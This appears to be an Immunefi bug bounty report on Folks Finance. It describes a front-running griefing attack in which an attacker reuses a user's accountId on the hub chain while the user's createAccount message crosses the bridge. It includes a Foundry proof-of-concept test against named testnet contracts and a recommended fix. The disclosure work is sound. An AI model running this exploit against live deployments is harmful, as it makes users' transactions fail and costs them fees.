# Boost \_ Folks Finance 33272 - \[Smart Contract - Medium] FrontRunning Attack on createAccount

Submitted on Tue Jul 16 2024 18:19:37 GMT-0400 (Atlantic Standard Time) by @cryptoticky for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33272

Report type: Smart Contract

Report severity: Medium

Target: <https://sepolia.etherscan.io/address/0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85>

Impacts:

* Unbounded gas consumption
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

An attacker can cause a user's message to fail by creating an account with the same accountId while the createAccount message is in transit through the bridge. As a result, the user loses the gas fees incurred for the transaction and the additional gas fees used for the bridge.

## Vulnerability Details

AccountId is not validated in any format in SpokeCommon.createAccount and AccountManager.createAccount. AccountId is any value created by user. So attacker can copy the account id from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network). This is possible because there is a delay while the message through the bridge.

## Impact Details

Gas costs on the Ethereum network are significantly higher than on the Avalanche network. While an attacker may incur less than $0.1 in costs to carry out the attack, the user could suffer losses between $5 and $10.

## Recommendation

It is advisable to set the accountId as the hash value of the userAddress and nonce.

## Proof of concept

## Proof of Concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/PoC.sol";


interface ISpokeCommon {
    struct MessageParams {
        uint16 adapterId; // where to route message through
        uint16 returnAdapterId; // if applicable, where to route message through for return message
        uint256 receiverValue; // amount of value to attach for receive message
        uint256 gasLimit; // gas limit for receive message
        uint256 returnGasLimit; // if applicable, gas limit for return message
    }

    function createAccount(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 refAccountId
    ) external payable;
}

contract FolksFinance is PoC {

    function setUp() virtual public {
        console.log("\n>>> Initial conditions");
    }

    function testCreateAccount() public {
        vm.createSelectFork("eth_testnet", 6322454);
        address user = vm.createWallet("user").addr;
        vm.startPrank(user);
        ISpokeCommon spokeCommon = ISpokeCommon(0x16Eecb8CeB2CE4Ec542634d7525191dfce587C85);
        ISpokeCommon.MessageParams memory params;
        params.adapterId = 2;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 201817;
        params.returnGasLimit = 0;

        bytes32 accountId = bytes32(uint256(1));
        bytes32 refAccountId;

        spokeCommon.createAccount{value: 13828150600000000}(params, accountId, refAccountId);
        // User has to pay for gas cost for this tx and fee(the gasLimit for targetChain).

        vm.stopPrank();

        // An attacker can carry out a frontrunning attack
        // The attacker the accountId from the Ethereum network's transaction history and use it to create an account on the HubChain (Avalanche network).
        // This is possible because it takes over 10 seconds to complete the transaction through the bridge.
        vm.createSelectFork("avalanche_testnet", 34872103);
        spokeCommon = ISpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00);
        params.adapterId = 1;
        params.returnAdapterId = 1;
        params.receiverValue = 0;
        params.gasLimit = 0;
        params.returnGasLimit = 0;

        accountId = bytes32(uint256(1));
        spokeCommon.createAccount(params, accountId, refAccountId);
        // Wormhole would send the message after the accountId is created and the tx would be failed.
    }
}
```
